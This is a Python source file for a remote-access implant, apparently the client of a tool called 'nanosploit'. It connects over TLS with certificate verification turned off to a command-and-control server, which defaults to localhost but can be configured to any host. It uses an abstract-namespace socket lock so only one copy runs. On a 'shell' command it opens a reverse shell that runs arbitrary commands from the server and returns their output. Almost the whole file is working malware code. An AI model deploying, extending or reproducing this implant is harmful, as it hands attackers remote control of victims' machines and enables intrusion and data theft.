import socket
import ssl
import subprocess
import os
import platform


''' PERSISTENCE '''


def persistence_linux() -> bool:
    # First check for lock

    # Without holding a reference to our socket somewhere it gets garbage collected when the function exits
    persistence_linux.lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    try:
        # The null byte (\0) means the socket is created in the abstract namespace instead of being created on the
        # file system itself.
        persistence_linux.lock_socket.bind('\0nanosploit')
    except socket.error:
        return True

    print("Persistence OK")
    return False


def persistence_windows() -> bool:
    return False


''' REVERSE SHELL '''


def reverse_shell(ss: ssl.SSLSocket):
    while True:
        # Send 'user:cwd' to server for prompt
        ss.send(b":".join((os.getlogin().encode(), os.getcwd().encode())))

        buffer = ss.recv()
        if buffer:
            # Get command from server
            buffer_arr = buffer.decode().split(" ")

            match buffer_arr[0]:
                case "cd":
                    # Change current directory
                    if len(buffer_arr) < 2:
                        ss.send(b"Missing argument")
                    else:
                        try:
                            os.chdir(buffer_arr[1])
                            ss.send(f"Moved to '{buffer_arr[1]}'".encode())
                        except Exception as e:
                            ss.send(str(e).encode())
                case "exit":
                    # Exit reverse shell
                    break
                case _:
                    # Execute command
                    output = subprocess.run(buffer.decode(), shell=True, capture_output=True, text=True)
                    ss.send(output.stdout.encode() + output.stderr.encode())


''' SECURE SOCKET '''


def init_connection() -> ssl.SSLSocket:
    # Create socket with ssl
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    ss = context.wrap_socket(s)

    # Connect to C2 server
    global HOST, PORT
    if "HOST" not in globals() and "PORT" not in globals():
        HOST, PORT = "127.0.0.1", 8000
    ss.connect((HOST, PORT))

    return ss


''' MAIN '''


def main():
    # Persistence
    already_running = False
    if platform.system() == "Linux":
        already_running = persistence_linux()
    elif platform.system() == "Windows":
        already_running = persistence_windows()

    if already_running:
        print("Already running, exiting...")
        return

    ss = init_connection()

    # Handle server commands
    while True:
        buffer = ss.recv()
        if buffer:
            match buffer:
                case b"ping":
                    ss.send(b"pong")
                case b"shell":
                    reverse_shell(ss)
                case b"persistence":
                    # TODO: return persistence status
                    pass
                case _:
                    print(f"Unknown command received: '{buffer.decode()}'")
                    ss.send(b"unknown")
        else:
            print("Lost server connection, exiting...")
            break

    # Exit program
    exit(0)


if __name__ == "__main__":
    main()
